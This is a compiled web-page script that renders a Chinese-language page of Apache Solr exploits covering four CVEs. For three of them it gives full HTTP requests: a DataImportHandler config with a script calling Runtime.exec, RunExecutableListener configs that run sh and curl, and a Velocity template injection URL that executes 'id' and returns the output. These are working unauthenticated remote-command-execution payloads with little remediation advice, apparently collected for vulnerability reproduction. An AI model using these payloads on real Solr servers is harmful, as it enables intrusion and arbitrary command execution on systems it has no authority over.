(window.webpackJsonp=window.webpackJsonp||[]).push([[78],{734:function(s,a,e){"use strict";e.r(a);var t=e(103),n=Object(t.a)({},(function(){var s=this,a=s.$createElement,e=s._self._c||a;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h2",{attrs:{id:"应用简介"}},[s._v("应用简介 "),e("a",{staticClass:"header-anchor",attrs:{href:"#应用简介"}},[s._v("#")])]),s._v(" "),e("p",[s._v("Apache Solr 是一个开源的搜索服务器。\nSolr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。")]),s._v(" "),e("h2",{attrs:{id:"cve-2019-0193-rce"}},[s._v("[CVE-2019-0193]-RCE "),e("a",{staticClass:"header-anchor",attrs:{href:"#cve-2019-0193-rce"}},[s._v("#")])]),s._v(" "),e("p",[e("strong",[s._v("漏洞概述")])]),s._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[s._v("#影响范围\nSolr < 8.2.0\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[s._v("此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。")]),s._v(" "),e("p",[s._v("它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。")]),s._v(" "),e("p",[s._v("由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行")]),s._v(" "),e("p",[e("strong",[s._v("漏洞利用")])]),s._v(" "),e("p",[s._v("1、访问"),e("code",[s._v("http://ip:8983/")]),s._v("Apache solr的管理页面，无需登录（默认未开启鉴权认证）")]),s._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token request-line"}},[e("span",{pre:!0,attrs:{class:"token property"}},[s._v("POST")]),s._v(" /solr/tika/dataimport HTTP/1.1")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Host:")]),s._v(" solr.com:8983\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("User-Agent:")]),s._v(" Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Accept:")]),s._v(" application/json, text/plain, */*\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Accept-Language:")]),s._v(" zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Accept-Encoding:")]),s._v(" gzip, deflate\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Referer:")]),s._v(" http://solr.com:8983/solr/\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-type:")]),s._v(" application/x-www-form-urlencoded\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("X-Requested-With:")]),s._v(" XMLHttpRequest\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Length:")]),s._v(" 585\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Connection:")]),s._v(' close\n\ncommand=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=\n<dataConfig>\n  <dataSource type="URLDataSource"/>\n  <script><![CDATA[\n          function poc(){ java.lang.Runtime.getRuntime().exec("echo \'666\' > ./666.txt");\n          }\n  ]]><\/script>\n  <document>\n    <entity name="stackoverflow"\n            url="https://stackoverflow.com/feeds/tag/solr"\n            processor="XPathEntityProcessor"\n            forEach="/feed"\n            transformer="script:poc" />\n  </document>\n</dataConfig>\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br")])]),e("p",[e("strong",[s._v("漏洞分析")])]),s._v(" "),e("p",[s._v("https://xz.aliyun.com/t/5965#toc-6")]),s._v(" "),e("h2",{attrs:{id:"cve-2017-12629-rce"}},[s._v("[CVE-2017-12629]-RCE "),e("a",{staticClass:"header-anchor",attrs:{href:"#cve-2017-12629-rce"}},[s._v("#")])]),s._v(" "),e("p",[e("strong",[s._v("漏洞概述")])]),s._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[s._v("#影响范围\nSolr < 7.1.0\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[e("strong",[s._v("漏洞利用")])]),s._v(" "),e("p",[s._v("1、访问"),e("code",[s._v("http://ip:8983/")]),s._v("Apache solr的管理页面，无需登录（默认未开启鉴权认证）")]),s._v(" "),e("p",[s._v("2、首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数")]),s._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token request-line"}},[e("span",{pre:!0,attrs:{class:"token property"}},[s._v("POST")]),s._v(" /solr/demo/config HTTP/1.1")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Host:")]),s._v(" your-ip\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Accept:")]),s._v(" */*\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Accept-Language:")]),s._v(" en\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("User-Agent:")]),s._v(" Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Connection:")]),s._v(" close\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Length:")]),s._v(' 158\n\n{"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "touch /tmp/success"]}}\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br")])]),e("p",[s._v("3、然后进行update操作，触发刚才添加的listener")]),s._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token request-line"}},[e("span",{pre:!0,attrs:{class:"token property"}},[s._v("POST")]),s._v(" /solr/demo/update HTTP/1.1")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Host:")]),s._v(" your-ip\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Accept:")]),s._v(" */*\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Accept-Language:")]),s._v(" en\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("User-Agent:")]),s._v(" Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Connection:")]),s._v(" close\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Type:")]),s._v(" application/json\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Length:")]),s._v(" 15"),e("span",{pre:!0,attrs:{class:"token application-json"}},[s._v("\n\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"id"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"test"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n")])])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br")])]),e("p",[s._v("第二种：直接触发RCE")]),s._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token request-line"}},[e("span",{pre:!0,attrs:{class:"token property"}},[s._v("POST")]),s._v(" /solr/newcollection/config HTTP/1.1")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Host:")]),s._v(" localhost:8983\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Connection:")]),s._v(" close\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Type:")]),s._v(" application/json  \n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Length:")]),s._v(" 198"),e("span",{pre:!0,attrs:{class:"token application-json"}},[s._v("\n\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n  "),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"add-listener"')]),s._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"event"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"newSearcher"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"name"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"newlistener-1"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"class"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"solr.RunExecutableListener"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"exe"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"curl"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"dir"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/usr/bin/"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"args"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://127.0.0.1:8080"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n  "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br")])]),e("h2",{attrs:{id:"cve-2018-8026-xxe"}},[s._v("[CVE-2018-8026]-XXE "),e("a",{staticClass:"header-anchor",attrs:{href:"#cve-2018-8026-xxe"}},[s._v("#")])]),s._v(" "),e("p",[e("strong",[s._v("漏洞概述")])]),s._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[s._v("#影响范围\n6.6.4\n7.3.1\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br")])]),e("p",[s._v("该XXE漏洞依赖于SolrCloud API，影响到SolrCloud分布式系统。而SolrCloud需要用到zookeeper")]),s._v(" "),e("p",[e("strong",[s._v("漏洞利用")])]),s._v(" "),e("p",[s._v("参考下边漏洞分析链接中的漏洞复现部分")]),s._v(" "),e("p",[e("strong",[s._v("修复建议")])]),s._v(" "),e("p",[s._v("升级补丁")]),s._v(" "),e("p",[e("strong",[s._v("漏洞分析")])]),s._v(" "),e("p",[s._v("https://xz.aliyun.com/t/2448#toc-7")]),s._v(" "),e("h2",{attrs:{id:"cve-2019-17558-模板注入"}},[s._v("[CVE-2019-17558]-模板注入 "),e("a",{staticClass:"header-anchor",attrs:{href:"#cve-2019-17558-模板注入"}},[s._v("#")])]),s._v(" "),e("p",[e("strong",[s._v("漏洞概述")])]),s._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[s._v("#影响范围\n5.0.0 ~ 8.3.1版本\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[s._v("攻击者通过未授权访问solr服务器，可以注入自定义模板，通过Velocity模板语言执行任意命令")]),s._v(" "),e("p",[s._v("发送特定的数据包开启 "),e("code",[s._v("params.resource.loader.enabled")]),s._v("，然后get访问接口执行命令")]),s._v(" "),e("p",[e("strong",[s._v("漏洞利用")])]),s._v(" "),e("p",[s._v("1、默认情况下"),e("code",[s._v("params.resource.loader.enabled")]),s._v("配置未打开，无法使用自定义模板")]),s._v(" "),e("p",[s._v("我们先通过如下API获取所有的核心：")]),s._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("http:")]),s._v("//your-ip:8983/solr/admin/cores?indexInfo=false&wt=json\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("2、通过如下请求开启"),e("code",[s._v("params.resource.loader.enabled")]),s._v("，其中API路径包含刚才获取的core名称")]),s._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token request-line"}},[e("span",{pre:!0,attrs:{class:"token property"}},[s._v("POST")]),s._v(" /solr/demo/config HTTP/1.1")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Host:")]),s._v(" solr:8983\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Type:")]),s._v(" application/json\n"),e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Content-Length:")]),s._v(" 259"),e("span",{pre:!0,attrs:{class:"token application-json"}},[s._v("\n\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n  "),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"update-queryresponsewriter"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"startup"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"lazy"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"name"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"velocity"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"class"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"solr.VelocityResponseWriter"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"template.base.dir"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('""')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"solr.resource.loader.enabled"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"true"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"params.resource.loader.enabled"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"true"')]),s._v("\n  "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br")])]),e("p",[s._v("3、之后，注入Velocity模板即可执行任意命令")]),s._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("http:")]),s._v("//your-ip:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("strong",[s._v("修复建议")])]),s._v(" "),e("p",[s._v("设置鉴权（暂时修复）")]),s._v(" "),e("p",[e("strong",[s._v("漏洞分析")])]),s._v(" "),e("p",[s._v("https://xz.aliyun.com/t/6700#toc-4")])])}),[],!1,null,null,null);a.default=n.exports}}]);